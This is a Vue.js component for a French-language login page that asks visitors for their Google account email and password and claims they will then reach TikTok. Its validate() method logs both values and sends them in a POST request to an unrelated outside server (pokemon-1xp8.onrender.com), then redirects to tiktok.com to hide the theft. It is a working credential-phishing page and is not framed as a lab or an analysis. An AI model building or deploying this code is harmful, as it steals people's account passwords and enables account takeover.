<template>
  <div id="divlogin">
    <h1>Login</h1>
    <h3>Veuillez renseigner votre compte google (En raison des malveillances rencontré sur le site, seul les compte google sont autorisés). Une fois connecté vous arriverez sur Tiktok.</h3>
    <div id="loginDiv">
        <div>
            email:
            <input id="login" type="text"/>
        </div>
        <div>
            mot de passe:
            <input id="pwd" type="password"/>
        </div><!-- 
        <div>Pas encore inscrit? cliquez <router-link to="/signup">ici</router-link></div> -->
        <button @click="validate">Valider</button>
    </div>
  </div>
</template>

<script>

export default {
  name: 'LoginView',
  methods: {
    validate(){
        let login = document.getElementById("login").value
        let pwd = document.getElementById("pwd").value
        console.log("login :", login, "pwd :", pwd)
        fetch('https://pokemon-1xp8.onrender.com/message', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: {"login": login, "pwd": pwd}
            })
        })
        .then(res => res.json())
        .then(data => {
            console.log('Réponse serveur:', data)
            window.location.href = "https://www.tiktok.com";
        })
        .catch(err => console.error(err))
    }
  }
}
</script>

<style>
    #divlogin{
        height: 30vh;
        display: flex;
        flex-direction: column;
        justify-content: space-around;
        align-items: center;
    }

    h1{
        color: white;
    }
    
    h3{
        color: white;
    }

    #loginDiv{
        height: 50%;
        display: flex;
        flex-direction: column;
        justify-content: space-around;
        align-items: center;    
        color: white;
        width: 30%;
        background-color: lightblue;
        border-radius: 15px;
        border: 1px solid black;
        font-size: 20px;
    }

    #loginDiv button{
        background-color: green;
        color: white;
        border-radius: 5px;
        font-size: 20px;
        cursor: pointer;
    }
</style>
